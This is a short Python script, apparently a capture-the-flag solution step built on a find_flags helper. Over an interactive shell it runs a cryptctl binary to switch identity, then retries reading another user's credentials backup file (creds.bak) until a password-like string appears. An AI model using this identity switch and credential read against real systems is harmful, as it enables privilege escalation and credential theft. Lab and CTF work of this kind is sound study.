"""Patient read of creds.bak: big waits, sentinel-driven, tolerant of lag."""
import asyncio
import base64
import os
import re
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import find_flags as ff  # noqa: E402
from find_flags import Shell  # noqa: E402


async def wait_for(sh, marker, timeout=60.0):
    buf, loop = "", asyncio.get_event_loop()
    end = loop.time() + timeout
    while loop.time() < end:
        buf += await sh.read(1.5)
        if marker in buf:
            return True, buf
    return False, buf


async def cmd(sh, command, timeout=60.0):
    tag = "Z" + uuid.uuid4().hex[:7]
    await sh.send(command)
    await asyncio.sleep(0.4)
    await sh.send(f"echo {tag}D")
    ok, buf = await wait_for(sh, f"{tag}D", timeout)
    lines = [l for l in buf.splitlines() if tag not in l]
    return ("\n".join(lines).strip(), ok)


async def body(sh):
    # settle
    await sh.read(5.0)

    print("### switch identity", flush=True)
    await sh.send("/opt/crypto/cryptctl")
    await asyncio.sleep(10.0)
    await sh.read(5.0)

    who, ok = await cmd(sh, "id", 45)
    print("id ->", who.strip()[:300], f"(sentinel={ok})", flush=True)

    for attempt in range(1, 5):
        print(f"\n### creds.bak attempt {attempt}", flush=True)
        res, ok = await cmd(sh, "cat /home/spookyboi/.backup/creds.bak 2>&1", 60)
        print("----- creds.bak -----", flush=True)
        print(res[:1500], f"(sentinel={ok})", flush=True)
        if "mort1cia" in res or ":" in res:
            return True
        await asyncio.sleep(4)
    return False


async def main():
    for attempt in range(1, 5):
        try:
            async with Shell() as sh:
                if await body(sh):
                    return
                print(f"[outer {attempt}] no luck", flush=True)
        except Exception as e:
            print(f"[outer {attempt}] {type(e).__name__}", flush=True)
        await asyncio.sleep(8)
    print("[!] failed", flush=True)


asyncio.run(main())
